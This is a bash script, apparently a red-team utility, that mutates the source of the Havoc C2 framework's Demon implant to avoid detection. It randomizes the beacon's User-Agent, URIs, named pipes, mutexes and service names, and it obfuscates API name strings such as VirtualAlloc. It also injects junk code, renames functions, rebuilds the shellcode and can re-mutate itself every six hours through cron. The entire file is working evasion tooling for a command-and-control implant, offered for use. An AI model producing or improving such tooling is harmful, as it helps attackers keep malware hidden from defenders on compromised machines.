#!/bin/bash
# Havoc Implant Mutation Tool
# Randomizes critical implant signatures to avoid detection

# === CONFIG ===
HAVOC_ROOT="${HAVOC_ROOT:-$HOME/Tools/Havoc}"
IMPLANT_DIR="$HAVOC_ROOT/payloads/Demon"
SRC_DIR="$IMPLANT_DIR/src"
OUTPUT_DIR="$HAVOC_ROOT/payloads"
OUTPUT_FILE="$OUTPUT_DIR/Shellcode.x64.bin"
BACKUP_DIR="$OUTPUT_DIR/backup"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
CONFIG_BACKUP="$BACKUP_DIR/havoc_config_$TIMESTAMP.bak"
LOG_FILE="$OUTPUT_DIR/mutation_$TIMESTAMP.log"

# === ADVANCED OPTIONS ===
RANDOMIZE_STRINGS=true      # Randomize identifiers
RANDOMIZE_FUNCTIONS=true    # Randomize function names
RANDOMIZE_IMPORTS=true      # Randomize import tables
RANDOMIZE_SECTIONS=true     # Randomize PE section names
RANDOMIZE_RESOURCES=true    # Randomize resource values
ADD_JUNK_CODE=true          # Add harmless junk code
ADD_STACK_STRINGS=true      # Use stack strings for sensitive strings

# === COLORS ===
RED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
NC='\033[0m'

# === UTILITY FUNCTIONS ===
log() {
    echo -e "$1" | tee -a "$LOG_FILE"
}

random_str() {
    local length=${1:-12}
    tr -dc 'A-Za-z0-9' </dev/urandom | head -c $length
}

random_hex() {
    local length=${1:-8}
    tr -dc 'a-f0-9' </dev/urandom | head -c $length
}

# Random word from a list that looks legitimate
random_plausible() {
    local words=("update" "service" "runtime" "kernel" "driver" "module" "system" "network" 
                "client" "server" "protocol" "stream" "buffer" "socket" "thread" "process"
                "event" "handler" "config" "registry" "memory" "session" "manager" "admin"
                "data" "file" "resource" "utility" "helper" "monitor" "controller" "agent")
    echo "${words[$RANDOM % ${#words[@]}]}_$(random_str 5 | tr '[:upper:]' '[:lower:]')"
}

# === BACKUP FUNCTIONS ===
backup_sources() {
    mkdir -p "$BACKUP_DIR/src_$TIMESTAMP"
    if [ -d "$SRC_DIR" ]; then
        cp -r "$SRC_DIR"/* "$BACKUP_DIR/src_$TIMESTAMP/"
        log "${GREEN}[✓] Source files backed up to: $BACKUP_DIR/src_$TIMESTAMP/${NC}"
    else
        log "${RED}[!] Source directory not found: $SRC_DIR${NC}"
        exit 1
    fi
    
    # Backup config file if it exists
    if [ -f "$HAVOC_ROOT/data/havoc.yaotl" ]; then
        cp "$HAVOC_ROOT/data/havoc.yaotl" "$CONFIG_BACKUP"
        log "${GREEN}[✓] Config file backed up to: $CONFIG_BACKUP${NC}"
    fi
    
    # Backup shellcode
    if [[ -f "$OUTPUT_FILE" ]]; then
        cp "$OUTPUT_FILE" "$BACKUP_DIR/implant_$TIMESTAMP.raw"
        log "${GREEN}[✓] Previous shellcode backed up to: $BACKUP_DIR/implant_$TIMESTAMP.raw${NC}"
    else
        log "${YELLOW}[!] No previous shellcode found to back up.${NC}"
    fi
}

# === MUTATION FUNCTIONS ===
mutate_transport_http() {
    local THTTP="$SRC_DIR/core/TransportHttp.c"
    if [[ -f "$THTTP" ]]; then
        # Generate a realistic looking User-Agent
        local browsers=("Mozilla/5.0" "Mozilla/4.0")
        local systems=("Windows NT 10.0; Win64; x64" "Windows NT 11.0; Win64; x64" "Macintosh; Intel Mac OS X 10_15_7")
        local engines=("AppleWebKit/537.36" "AppleWebKit/605.1.15" "Gecko/20100101")
        local browser_versions=("Chrome/91.0.4472.124" "Chrome/96.0.4664.110" "Safari/537.36" "Edge/91.0.864.59" "Firefox/89.0")
        
        local UA="${browsers[$RANDOM % ${#browsers[@]}]} (${systems[$RANDOM % ${#systems[@]}]}) ${engines[$RANDOM % ${#engines[@]}]} ${browser_versions[$RANDOM % ${#browser_versions[@]}]}"
        local URI=$(random_plausible)
        
        # Replace the User-Agent
        sed -i "s/User-Agent: .*/User-Agent: ${UA}\\r\\n\";/" "$THTTP"
        
        # Replace URI paths
        sed -i "s|/stage|/${URI}|g" "$THTTP"
        sed -i "s|/[a-zA-Z0-9_-]*\.css|/${random_plausible}.css|g" "$THTTP"
        sed -i "s|/[a-zA-Z0-9_-]*\.js|/${random_plausible}.js|g" "$THTTP"
        sed -i "s|/[a-zA-Z0-9_-]*\.html|/${random_plausible}.html|g" "$THTTP"
        sed -i "s|/[a-zA-Z0-9_-]*\.png|/${random_plausible}.png|g" "$THTTP"
        
        # Randomize headers order where possible
        if grep -q "Accept:" "$THTTP"; then
            sed -i "s/Accept: .*/Accept: *\/*\\r\\n\";/" "$THTTP"
        fi
        
        # Add additional headers
        HEADER_LINE=$(grep -n "User-Agent:" "$THTTP" | cut -d':' -f1)
        if [ -n "$HEADER_LINE" ]; then
            sed -i "${HEADER_LINE}a\\    HeadersAppend( Request, \"Accept-Language: en-US,en;q=0.9\\r\\n\" );" "$THTTP"
            sed -i "${HEADER_LINE}a\\    HeadersAppend( Request, \"Cache-Control: max-age=0\\r\\n\" );" "$THTTP"
        fi
        
        log "${GREEN}[✓] Transport HTTP mutations applied:"
        log "  - User-Agent: ${UA}"
        log "  - URI path: /${URI}"
        log "  - Added randomized headers${NC}"
    else
        log "${YELLOW}[!] TransportHttp.c not found. Skipping HTTP transport mutation.${NC}"
    fi
}

mutate_named_resources() {
    # Find suitable targets
    local TARGETS=("$SRC_DIR/core/Runtime.c" "$SRC_DIR/main/MainExe.c" "$SRC_DIR/common/Common.c")
    local PIPE=$(random_plausible)
    local MUTEX=$(random_plausible)
    local SERVICE=$(random_plausible)
    local FOUND=false
    
    for TARGET_FILE in "${TARGETS[@]}"; do
        if [[ -f "$TARGET_FILE" ]]; then
            FOUND=true
            
            # Replace named pipes
            if grep -q "\\\\\.\\\\pipe\\\\" "$TARGET_FILE"; then
                sed -i "s|\\\\\\\\.\\\\pipe\\\\[a-zA-Z0-9_-]*|\\\\\\\\.\\\\pipe\\\\${PIPE}|g" "$TARGET_FILE"
                log "${GREEN}[✓] Randomized named pipe: \\\\.\\pipe\\${PIPE}${NC}"
            fi
            
            # Replace mutexes
            if grep -q "Mutex_" "$TARGET_FILE"; then
                sed -i "s|Mutex_[a-zA-Z0-9_-]*|Mutex_${MUTEX}|g" "$TARGET_FILE"
                log "${GREEN}[✓] Randomized mutex: Mutex_${MUTEX}${NC}"
            fi
            
            # Replace service names if they exist
            if grep -q "ServiceName" "$TARGET_FILE"; then
                sed -i "s|ServiceName[\"'][a-zA-Z0-9_-]*[\"']|ServiceName\"${SERVICE}\"|g" "$TARGET_FILE"
                log "${GREEN}[✓] Randomized service name: ${SERVICE}${NC}"
            fi
        fi
    done
    
    if ! $FOUND; then
        log "${YELLOW}[!] No suitable files found to mutate named resources.${NC}"
    fi
}

mutate_memory_strings() {
    local STRING_FILES=("$SRC_DIR/core/Memory.c" "$SRC_DIR/core/Spoof.c" "$SRC_DIR/core/Win32.c")
    local FOUND=false
    
    for STRING_FILE in "${STRING_FILES[@]}"; do
        if [[ -f "$STRING_FILE" ]]; then
            FOUND=true
            
            # Replace memory allocation strings
            sed -i "s|VirtualAlloc|$(random_str 12)|g" "$STRING_FILE"
            sed -i "s|VirtualProtect|$(random_str 12)|g" "$STRING_FILE"
            sed -i "s|HeapAlloc|$(random_str 12)|g" "$STRING_FILE"
            sed -i "s|HeapCreate|$(random_str 12)|g" "$STRING_FILE"
            sed -i "s|CreateThread|$(random_str 12)|g" "$STRING_FILE"
            
            log "${GREEN}[✓] Randomized memory function strings in ${STRING_FILE}${NC}"
        fi
    done
    
    if ! $FOUND; then
        log "${YELLOW}[!] No memory string files found to mutate.${NC}"
    fi
}

mutate_config_file() {
    local CONFIG_FILE="$HAVOC_ROOT/data/havoc.yaotl"
    if [[ -f "$CONFIG_FILE" ]]; then
        # Generate new values
        local USER_AGENT="Mozilla/5.0 (Windows NT $(( $RANDOM % 4 + 8 )).$(( $RANDOM % 2 + 1 )); Win64; x64) AppleWebKit/$(( $RANDOM % 200 + 500 )).$(( $RANDOM % 50 + 1 ))"
        local SLEEP_TIME=$(( $RANDOM % 10 + 2 ))
        local JITTER_PCT=$(( $RANDOM % 40 + 20 ))
        
        # Update configuration values
        sed -i "s/Sleep[ \t]*=[ \t]*[0-9]*/Sleep            = $SLEEP_TIME/" "$CONFIG_FILE"
        sed -i "s/SleepJitter[ \t]*=[ \t]*[0-9]*/SleepJitter      = $JITTER_PCT/" "$CONFIG_FILE"
        sed -i "s/UserAgent[ \t]*=[ \t]*\"[^\"]*\"/UserAgent    = \"$USER_AGENT\"/" "$CONFIG_FILE"
        
        # Randomize URI paths
        sed -i '/Uris/,/]/{ s|"/[^"]*"|"/'"$(random_plausible)"'"|g }' "$CONFIG_FILE"
        
        log "${GREEN}[✓] Configuration file updated:"
        log "  - Sleep time: ${SLEEP_TIME} seconds"
        log "  - Jitter: ${JITTER_PCT}%"
        log "  - User-Agent & URIs randomized${NC}"
    else
        log "${YELLOW}[!] Configuration file not found at ${CONFIG_FILE}${NC}"
    fi
}

add_junk_code() {
    if ! $ADD_JUNK_CODE; then
        return
    fi
    
    local C_FILES=$(find "$SRC_DIR" -name "*.c")
    local FOUND=false
    
    for C_FILE in $C_FILES; do
        if [[ -f "$C_FILE" ]]; then
            FOUND=true
            
            # Add junk function that does nothing
            local JUNK_FUNC="void $(random_plausible)() { int i = 0; for(i=0; i<10; i++) { i++; i--; } }"
            echo -e "\n$JUNK_FUNC" >> "$C_FILE"
            
            # Add junk global variable
            local JUNK_VAR="static const char* $(random_plausible)_str = \"$(random_str 16)\";"
            sed -i "1s/^/$JUNK_VAR\n/" "$C_FILE"
            
            log "${GREEN}[✓] Added junk code to ${C_FILE}${NC}"
        fi
    done
    
    if ! $FOUND; then
        log "${YELLOW}[!] No C files found to add junk code.${NC}"
    fi
}

randomize_function_names() {
    if ! $RANDOMIZE_FUNCTIONS; then
        return
    fi
    
    local H_FILES=$(find "$SRC_DIR" -name "*.h")
    local FOUND=false
    
    for H_FILE in $H_FILES; do
        if [[ -f "$H_FILE" && $(basename "$H_FILE") != "Common.h" && $(basename "$H_FILE") != "Native.h" ]]; then
            FOUND=true
            
            # Get function declarations
            local FUNCTIONS=$(grep -E "VOID [A-Za-z0-9_]+\(" "$H_FILE" | grep -v "KERNEL" | grep -v "WINAPI" | awk '{print $2}' | cut -d'(' -f1)
            
            for FUNC in $FUNCTIONS; do
                if [[ "$FUNC" != "main" && "$FUNC" != "DllMain" && ! "$FUNC" =~ ^DemOn ]]; then
                    local NEW_FUNC="${FUNC}_$(random_str 4)"
                    
                    # Replace in header file
                    sed -i "s/\<$FUNC\>/$NEW_FUNC/g" "$H_FILE"
                    
                    # Find and replace in all .c files
                    find "$SRC_DIR" -name "*.c" -exec sed -i "s/\<$FUNC\>/$NEW_FUNC/g" {} \;
                    
                    log "${BLUE}[i] Renamed function: $FUNC → $NEW_FUNC${NC}"
                fi
            done
        fi
    done
    
    if ! $FOUND; then
        log "${YELLOW}[!] No header files found to randomize function names.${NC}"
    fi
}

# === BUILD FUNCTION ===
rebuild_implant() {
    log "${YELLOW}[+] Rebuilding Havoc payload...${NC}"
    
    # Check if we should use make from the project root
    if [ -f "$HAVOC_ROOT/Makefile" ]; then
        cd "$HAVOC_ROOT" || exit 1
        make clean >/dev/null 2>&1
        make >/dev/null 2>&1
        
        if [ $? -ne 0 ]; then
            log "${RED}[!] Build failed at project root level${NC}"
            return 1
        fi
    # Otherwise try to build just the implant
    elif [ -f "$IMPLANT_DIR/Makefile" ]; then
        cd "$IMPLANT_DIR" || exit 1
        make clean >/dev/null 2>&1
        make >/dev/null 2>&1
        
        if [ $? -ne 0 ]; then
            log "${RED}[!] Build failed at implant level${NC}"
            return 1
        fi
    else
        log "${RED}[!] No Makefile found to build the implant${NC}"
        return 1
    fi
    
    # Verify the shellcode was generated
    if [[ -f "$OUTPUT_FILE" ]]; then
        log "${GREEN}[✓] Build successful! New shellcode generated at: $OUTPUT_FILE${NC}"
        
        # Calculate hash for verification
        local NEW_HASH=$(sha256sum "$OUTPUT_FILE" | cut -d' ' -f1)
        log "${GREEN}[✓] New shellcode hash: ${NEW_HASH}${NC}"
        
        # Optional: Compare with previous hash if a backup exists
        local BACKUP_FILE="$BACKUP_DIR/implant_$TIMESTAMP.raw"
        if [[ -f "$BACKUP_FILE" ]]; then
            local OLD_HASH=$(sha256sum "$BACKUP_FILE" | cut -d' ' -f1)
            if [[ "$NEW_HASH" != "$OLD_HASH" ]]; then
                log "${GREEN}[✓] Verified: Shellcode has been successfully mutated${NC}"
            else
                log "${YELLOW}[!] Warning: New shellcode hash matches old hash${NC}"
            fi
        fi
        
        return 0
    else
        log "${RED}[!] Build failed or shellcode was not generated at expected location: $OUTPUT_FILE${NC}"
        return 1
    fi
}

# === AUTO-SCHEDULING FUNCTION ===
setup_auto_mutation() {
    local SCRIPT_PATH=$(realpath "$0")
    local CRON_ENTRY="0 */6 * * * $SCRIPT_PATH > /dev/null 2>&1"
    
    # Check if already in crontab
    if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        log "${YELLOW}[!] Auto-mutation already scheduled in crontab${NC}"
        return
    fi
    
    # Add to crontab
    (crontab -l 2>/dev/null || echo "") | echo "$CRON_ENTRY" | crontab -
    
    if [ $? -eq 0 ]; then
        log "${GREEN}[✓] Auto-mutation scheduled for every 6 hours${NC}"
    else
        log "${RED}[!] Failed to schedule auto-mutation${NC}"
    fi
}

# === MAIN EXECUTION ===
main() {
    # Create directories
    mkdir -p "$BACKUP_DIR"
    mkdir -p "$OUTPUT_DIR"
    
    # Start log file
    echo "=== Havoc Implant Mutation Log - $TIMESTAMP ===" > "$LOG_FILE"
    
    log "${BLUE}════════════════════════════════════════════${NC}"
    log "${BLUE}     Havoc Implant Mutation Tool v1.0       ${NC}"
    log "${BLUE}════════════════════════════════════════════${NC}"
    
    # Check for Havoc installation
    if [ ! -d "$HAVOC_ROOT" ]; then
        log "${RED}[!] Havoc root directory not found at: $HAVOC_ROOT${NC}"
        log "${YELLOW}[!] Use HAVOC_ROOT=/path/to/havoc $0 to specify location${NC}"
        exit 1
    fi
    
    # Backup everything first
    log "${YELLOW}[+] Backing up current implant and source files...${NC}"
    backup_sources
    
    # Start mutations
    log "${YELLOW}[+] Starting implant mutations...${NC}"
    
    # Apply all mutation types
    mutate_transport_http
    mutate_named_resources
    mutate_memory_strings
    mutate_config_file
    
    # Advanced mutations
    if $ADD_JUNK_CODE; then
        add_junk_code
    fi
    
    if $RANDOMIZE_FUNCTIONS; then
        randomize_function_names
    fi
    
    # Rebuild the implant
    rebuild_implant
    
    # Show completion summary
    log "${BLUE}════════════════════════════════════════════${NC}"
    log "${GREEN}[✓] Implant mutation completed successfully!${NC}"
    log "${GREEN}[✓] Backup saved to: ${BACKUP_DIR}${NC}"
    log "${GREEN}[✓] Log file: ${LOG_FILE}${NC}"
    log "${BLUE}════════════════════════════════════════════${NC}"
    
    # Ask about auto-scheduling
    if [ -t 0 ]; then  # Only if running interactively
        read -p "Would you like to set up automatic mutation every 6 hours? (y/n): " SETUP_AUTO
        if [ "$SETUP_AUTO" = "y" ]; then
            setup_auto_mutation
        fi
    fi
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --auto-schedule)
            setup_auto_mutation
            exit 0
            ;;
        --no-junk)
            ADD_JUNK_CODE=false
            shift
            ;;
        --no-functions)
            RANDOMIZE_FUNCTIONS=false
            shift
            ;;
        --config-only)
            # Only modify the config file
            mkdir -p "$BACKUP_DIR"
            backup_sources
            mutate_config_file
            exit 0
            ;;
        --help)
            echo "Usage: $0 [options]"
            echo "Options:"
            echo "  --auto-schedule    Setup automatic mutation via crontab"
            echo "  --no-junk          Don't add junk code to source files"
            echo "  --no-functions     Don't randomize function names"
            echo "  --config-only      Only modify the configuration file"
            echo "  --help             Show this help message"
            echo ""
            echo "Environment variables:"
            echo "  HAVOC_ROOT         Path to Havoc installation (default: $HOME/Tools/Havoc)"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

# Execute main logic
main